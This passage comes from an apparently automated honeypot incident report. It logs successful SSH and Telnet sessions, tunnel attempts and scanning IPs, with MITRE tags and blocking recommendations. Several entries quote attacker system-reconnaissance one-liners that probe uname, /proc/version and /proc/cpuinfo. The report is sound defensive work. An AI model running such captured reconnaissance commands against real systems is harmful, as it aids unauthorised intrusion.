| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:07:53` | `cowrie.session.connect` |
| `2026-07-28 16:07:54` | `cowrie.client.version` |
| `2026-07-28 16:07:54` | `cowrie.client.kex` |
| `2026-07-28 16:08:04` | `cowrie.login.success` |
| `2026-07-28 16:08:09` | `cowrie.session.params` |
| `2026-07-28 16:08:09` | `cowrie.command.input` |
| `2026-07-28 16:08:11` | `cowrie.log.closed` |
| `2026-07-28 16:08:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `27.50.29[.]181` to AbuseIPDB if not already reported
- [ ] Block `27.50.29[.]181` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76b8231848d9

| Field | Detail |
|---|---|
| **Source IP** | `118.183.180[.]108` |
| **First Seen** | 2026-07-28 16:09 |
| **Last Seen** | 2026-07-28 16:09 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:09:01` | `cowrie.session.connect` |
| `2026-07-28 16:09:02` | `cowrie.client.version` |
| `2026-07-28 16:09:02` | `cowrie.client.kex` |
| `2026-07-28 16:09:05` | `cowrie.login.success` |
| `2026-07-28 16:09:06` | `cowrie.direct-tcpip.request` |
| `2026-07-28 16:09:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.183.180[.]108` to AbuseIPDB if not already reported
- [ ] Block `118.183.180[.]108` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcf34ac82218

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-28 16:09 |
| **Last Seen** | 2026-07-28 16:09 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:09:53` | `cowrie.session.connect` |
| `2026-07-28 16:09:53` | `cowrie.client.version` |
| `2026-07-28 16:09:53` | `cowrie.client.kex` |
| `2026-07-28 16:09:54` | `cowrie.login.success` |
| `2026-07-28 16:09:55` | `cowrie.session.params` |
| `2026-07-28 16:09:55` | `cowrie.command.input` |
| `2026-07-28 16:09:55` | `cowrie.command.input` |
| `2026-07-28 16:09:55` | `cowrie.command.input` |
| `2026-07-28 16:09:55` | `cowrie.command.input` |
| `2026-07-28 16:09:55` | `cowrie.command.input` |
| `2026-07-28 16:09:55` | `cowrie.command.success` |
| `2026-07-28 16:09:55` | `cowrie.command.input` |
| `2026-07-28 16:09:55` | `cowrie.command.input` |
| `2026-07-28 16:09:55` | `cowrie.command.input` |
| `2026-07-28 16:09:55` | `cowrie.command.input` |
| `2026-07-28 16:09:55` | `cowrie.log.closed` |
| `2026-07-28 16:09:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c803fe5f5699

| Field | Detail |
|---|---|
| **Source IP** | `213.130.207[.]177` |
| **First Seen** | 2026-07-28 16:12 |
| **Last Seen** | 2026-07-28 16:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:12:13` | `cowrie.session.connect` |
| `2026-07-28 16:12:14` | `cowrie.client.version` |
| `2026-07-28 16:12:14` | `cowrie.client.kex` |
| `2026-07-28 16:12:15` | `cowrie.login.success` |
| `2026-07-28 16:12:15` | `cowrie.direct-tcpip.request` |
| `2026-07-28 16:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.130.207[.]177` to AbuseIPDB if not already reported
- [ ] Block `213.130.207[.]177` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b1e73d1e8447

| Field | Detail |
|---|---|
| **Source IP** | `154.219.116[.]177` |
| **First Seen** | 2026-07-28 16:12 |
| **Last Seen** | 2026-07-28 16:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `root, enable, system, sh, cat /proc/cpuinfo 2>/dev/null | head -5; uname -m 2>/dev/null; echo ENDARCH` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:12:17` | `cowrie.session.connect` |
| `2026-07-28 16:12:17` | `cowrie.login.success` |
| `2026-07-28 16:12:18` | `cowrie.session.params` |
| `2026-07-28 16:12:18` | `cowrie.telnet.option` |
| `2026-07-28 16:12:18` | `cowrie.command.input` |
| `2026-07-28 16:12:18` | `cowrie.command.failed` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.failed` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.failed` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.success` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.log.closed` |
| `2026-07-28 16:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.116[.]177` to AbuseIPDB if not already reported
- [ ] Block `154.219.116[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-231718cdeac0

| Field | Detail |
|---|---|
| **Source IP** | `154.219.116[.]177` |
| **First Seen** | 2026-07-28 16:12 |
| **Last Seen** | 2026-07-28 16:12 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `root, enable, system, sh, cat /proc/cpuinfo 2>/dev/null | head -5; uname -m 2>/dev/null; echo ENDARCH` |
| **TTPs (MITRE)** | T1021.004 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:12:17` | `cowrie.session.connect` |
| `2026-07-28 16:12:18` | `cowrie.login.success` |
| `2026-07-28 16:12:19` | `cowrie.session.params` |
| `2026-07-28 16:12:19` | `cowrie.telnet.option` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.failed` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.failed` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.failed` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.success` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.command.input` |
| `2026-07-28 16:12:19` | `cowrie.log.closed` |
| `2026-07-28 16:12:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.219.116[.]177` to AbuseIPDB if not already reported
- [ ] Block `154.219.116[.]177` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3bdc3b25d867

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-28 16:13 |
| **Last Seen** | 2026-07-28 16:13 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:13:35` | `cowrie.session.connect` |
| `2026-07-28 16:13:35` | `cowrie.client.version` |
| `2026-07-28 16:13:35` | `cowrie.client.kex` |
| `2026-07-28 16:13:36` | `cowrie.login.success` |
| `2026-07-28 16:13:37` | `cowrie.session.params` |
| `2026-07-28 16:13:37` | `cowrie.command.input` |
| `2026-07-28 16:13:37` | `cowrie.command.input` |
| `2026-07-28 16:13:37` | `cowrie.command.input` |
| `2026-07-28 16:13:37` | `cowrie.command.input` |
| `2026-07-28 16:13:37` | `cowrie.command.input` |
| `2026-07-28 16:13:37` | `cowrie.command.success` |
| `2026-07-28 16:13:37` | `cowrie.command.input` |
| `2026-07-28 16:13:37` | `cowrie.command.input` |
| `2026-07-28 16:13:37` | `cowrie.command.input` |
| `2026-07-28 16:13:37` | `cowrie.command.input` |
| `2026-07-28 16:13:37` | `cowrie.log.closed` |
| `2026-07-28 16:13:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58264cbae3ce

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-28 16:17 |
| **Last Seen** | 2026-07-28 16:17 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:17:09` | `cowrie.session.connect` |
| `2026-07-28 16:17:09` | `cowrie.client.version` |
| `2026-07-28 16:17:09` | `cowrie.client.kex` |
| `2026-07-28 16:17:14` | `cowrie.login.success` |
| `2026-07-28 16:17:17` | `cowrie.session.params` |
| `2026-07-28 16:17:17` | `cowrie.command.input` |
| `2026-07-28 16:17:17` | `cowrie.command.input` |
| `2026-07-28 16:17:17` | `cowrie.command.input` |
| `2026-07-28 16:17:17` | `cowrie.command.input` |
| `2026-07-28 16:17:17` | `cowrie.command.input` |
| `2026-07-28 16:17:17` | `cowrie.command.success` |
| `2026-07-28 16:17:17` | `cowrie.command.input` |
| `2026-07-28 16:17:17` | `cowrie.command.input` |
| `2026-07-28 16:17:17` | `cowrie.command.input` |
| `2026-07-28 16:17:17` | `cowrie.command.input` |
| `2026-07-28 16:17:18` | `cowrie.log.closed` |
| `2026-07-28 16:17:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c45156ed33d0

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]234` |
| **First Seen** | 2026-07-28 16:19 |
| **Last Seen** | 2026-07-28 16:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:19:53` | `cowrie.session.connect` |
| `2026-07-28 16:19:54` | `cowrie.client.version` |
| `2026-07-28 16:19:54` | `cowrie.client.kex` |
| `2026-07-28 16:19:59` | `cowrie.login.success` |
| `2026-07-28 16:20:02` | `cowrie.session.params` |
| `2026-07-28 16:20:02` | `cowrie.command.input` |
| `2026-07-28 16:20:02` | `cowrie.command.input` |
| `2026-07-28 16:20:02` | `cowrie.command.input` |
| `2026-07-28 16:20:02` | `cowrie.command.input` |
| `2026-07-28 16:20:02` | `cowrie.command.input` |
| `2026-07-28 16:20:02` | `cowrie.command.success` |
| `2026-07-28 16:20:02` | `cowrie.command.input` |
| `2026-07-28 16:20:02` | `cowrie.command.input` |
| `2026-07-28 16:20:02` | `cowrie.command.input` |
| `2026-07-28 16:20:02` | `cowrie.command.input` |
| `2026-07-28 16:20:03` | `cowrie.log.closed` |
| `2026-07-28 16:20:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]234` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]234` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b843031cd4fd

| Field | Detail |
|---|---|
| **Source IP** | `201.63.52[.]54` |
| **First Seen** | 2026-07-28 16:22 |
| **Last Seen** | 2026-07-28 16:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:22:28` | `cowrie.session.connect` |
| `2026-07-28 16:22:28` | `cowrie.client.version` |
| `2026-07-28 16:22:28` | `cowrie.client.kex` |
| `2026-07-28 16:22:30` | `cowrie.login.success` |
| `2026-07-28 16:22:31` | `cowrie.direct-tcpip.request` |
| `2026-07-28 16:22:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `201.63.52[.]54` to AbuseIPDB if not already reported
- [ ] Block `201.63.52[.]54` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f1f28946c9a

| Field | Detail |
|---|---|
| **Source IP** | `211.53.58[.]10` |
| **First Seen** | 2026-07-28 16:22 |
| **Last Seen** | 2026-07-28 16:22 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:22:37` | `cowrie.session.connect` |
| `2026-07-28 16:22:39` | `cowrie.client.version` |
| `2026-07-28 16:22:39` | `cowrie.client.kex` |
| `2026-07-28 16:22:44` | `cowrie.login.success` |
| `2026-07-28 16:22:45` | `cowrie.direct-tcpip.request` |
| `2026-07-28 16:22:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `211.53.58[.]10` to AbuseIPDB if not already reported
- [ ] Block `211.53.58[.]10` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9646126266b2

| Field | Detail |
|---|---|
| **Source IP** | `45.170.50[.]2` |
| **First Seen** | 2026-07-28 16:27 |
| **Last Seen** | 2026-07-28 16:27 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:27:12` | `cowrie.session.connect` |
| `2026-07-28 16:27:13` | `cowrie.client.version` |
| `2026-07-28 16:27:13` | `cowrie.client.kex` |
| `2026-07-28 16:27:14` | `cowrie.login.success` |
| `2026-07-28 16:27:15` | `cowrie.direct-tcpip.request` |
| `2026-07-28 16:27:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.170.50[.]2` to AbuseIPDB if not already reported
- [ ] Block `45.170.50[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8fdc59531f4

| Field | Detail |
|---|---|
| **Source IP** | `45.178.227[.]0` |
| **First Seen** | 2026-07-28 16:27 |
| **Last Seen** | 2026-07-28 16:27 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:27:20` | `cowrie.session.connect` |
| `2026-07-28 16:27:20` | `cowrie.client.version` |
| `2026-07-28 16:27:20` | `cowrie.client.kex` |
| `2026-07-28 16:27:21` | `cowrie.login.success` |
| `2026-07-28 16:27:22` | `cowrie.direct-tcpip.request` |
| `2026-07-28 16:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.178.227[.]0` to AbuseIPDB if not already reported
- [ ] Block `45.178.227[.]0` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5b6c4ec71f66

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-28 16:44 |
| **Last Seen** | 2026-07-28 16:44 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:44:36` | `cowrie.session.connect` |
| `2026-07-28 16:44:36` | `cowrie.client.version` |
| `2026-07-28 16:44:36` | `cowrie.client.kex` |
| `2026-07-28 16:44:36` | `cowrie.login.success` |
| `2026-07-28 16:44:37` | `cowrie.direct-tcpip.request` |
| `2026-07-28 16:44:37` | `cowrie.direct-tcpip.data` |
| `2026-07-28 16:44:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f3201b0fb0a0

| Field | Detail |
|---|---|
| **Source IP** | `49.124.153[.]19` |
| **First Seen** | 2026-07-28 16:47 |
| **Last Seen** | 2026-07-28 16:47 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:47:13` | `cowrie.session.connect` |
| `2026-07-28 16:47:14` | `cowrie.client.version` |
| `2026-07-28 16:47:14` | `cowrie.client.kex` |
| `2026-07-28 16:47:16` | `cowrie.login.success` |
| `2026-07-28 16:47:16` | `cowrie.direct-tcpip.request` |
| `2026-07-28 16:47:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.124.153[.]19` to AbuseIPDB if not already reported
- [ ] Block `49.124.153[.]19` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18370d0c9313

| Field | Detail |
|---|---|
| **Source IP** | `60.173.105[.]206` |
| **First Seen** | 2026-07-28 16:48 |
| **Last Seen** | 2026-07-28 16:48 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-28 16:48:33` | `cowrie.session.connect` |
| `2026-07-28 16:48:34` | `cowrie.client.version` |
| `2026-07-28 16:48:34` | `cowrie.client.kex` |
| `2026-07-28 16:48:37` | `cowrie.login.success` |
| `2026-07-28 16:48:38` | `cowrie.direct-tcpip.request` |
| `2026-07-28 16:48:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.173.105[.]206` to AbuseIPDB if not already reported
- [ ] Block `60.173.105[.]206` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `91.233.83[.]203` | **41** | 2026-07-28 13:01 | 2026-07-28 16:53 | 35m | 0 | `T1592` | 🟠 MEDIUM |
| `139.199.80[.]137` | **9** | 2026-07-28 12:59 | 2026-07-28 16:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.238.181[.]92` | **6** | 2026-07-28 15:11 | 2026-07-28 15:40 | 0m | 0 | `T1592` | 🟢 LOW |
| `199.45.155[.]93` | **3** | 2026-07-28 15:28 | 2026-07-28 15:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.227.254[.]154` | **3** | 2026-07-28 13:52 | 2026-07-28 13:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]46` | **3** | 2026-07-28 15:54 | 2026-07-28 15:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.186[.]170` | **3** | 2026-07-28 15:54 | 2026-07-28 15:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]41` | **3** | 2026-07-28 15:52 | 2026-07-28 15:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `8.134.157[.]132` | **3** | 2026-07-28 13:28 | 2026-07-28 13:31 | 4m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]121` | **3** | 2026-07-28 16:22 | 2026-07-28 16:22 | 0m | 0 | `T1592` | 🟢 LOW |
| `88.214.25[.]123` | **3** | 2026-07-28 14:06 | 2026-07-28 14:06 | 0m | 0 | `T1592` | 🟢 LOW |
| `121.227.232[.]58` | **2** | 2026-07-28 16:51 | 2026-07-28 16:53 | 2m | 0 | `T1592` | 🟢 LOW |
| `163.177.76[.]83` | **2** | 2026-07-28 13:36 | 2026-07-28 13:38 | 2m | 0 | `T1592` | 🟢 LOW |
| `195.178.110[.]137` | **2** | 2026-07-28 12:55 | 2026-07-28 12:58 | 0m | 0 | `T1592` | 🟢 LOW |
| `80.94.92[.]234` | **2** | 2026-07-28 15:35 | 2026-07-28 16:00 | 0m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `87.236.176[.]202` | **2** | 2026-07-28 13:55 | 2026-07-28 13:55 | 0m | 0 | `T1592` | 🟢 LOW |
| `91.92.40[.]18` | **2** | 2026-07-28 14:32 | 2026-07-28 14:50 | 0m | 0 | `T1592` | 🟢 LOW |
| `104.152.52[.]58` | 1 | 2026-07-28 15:15 | 2026-07-28 15:15 | 0s | 0 | `T1592` | 🟢 LOW |
| `115.190.192[.]114` | 1 | 2026-07-28 14:23 | 2026-07-28 14:25 | 120s | 0 | `T1592` | 🟢 LOW |
| `115.86.227[.]79` | 1 | 2026-07-28 16:47 | 2026-07-28 16:47 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.177.172[.]64` | 1 | 2026-07-28 14:11 | 2026-07-28 14:11 | 0s | 0 | `T1592` | 🟢 LOW |
| `116.181.16[.]138` | 1 | 2026-07-28 14:12 | 2026-07-28 14:14 | 120s | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | 1 | 2026-07-28 13:12 | 2026-07-28 13:12 | 40s | 0 | `T1592` | 🟢 LOW |
| `150.95.66[.]172` | 1 | 2026-07-28 15:13 | 2026-07-28 15:14 | 35s | 0 | `T1592` | 🟢 LOW |
| `165.232.61[.]133` | 1 | 2026-07-28 14:09 | 2026-07-28 14:09 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.242.226[.]60` | 1 | 2026-07-28 16:45 | 2026-07-28 16:45 | 0s | 0 | `T1592` | 🟢 LOW |
| `198.199.94[.]79` | 1 | 2026-07-28 14:53 | 2026-07-28 14:54 | 30s | 0 | `T1592` | 🟢 LOW |
| `2.57.122[.]209` | 1 | 2026-07-28 14:20 | 2026-07-28 14:20 | 0s | 0 | `T1592` | 🟢 LOW |
| `210.0.90[.]81` | 1 | 2026-07-28 16:48 | 2026-07-28 16:48 | 7s | 0 | `T1592` | 🟢 LOW |
| `36.26.78[.]218` | 1 | 2026-07-28 15:13 | 2026-07-28 15:15 | 120s | 0 | `T1592` | 🟢 LOW |
| `39.104.64[.]139` | 1 | 2026-07-28 14:24 | 2026-07-28 14:24 | 8s | 0 | `T1592` | 🟢 LOW |
| `45.148.10[.]147` | 1 | 2026-07-28 13:03 | 2026-07-28 13:03 | 0s | 0 | `T1592` | 🟢 LOW |
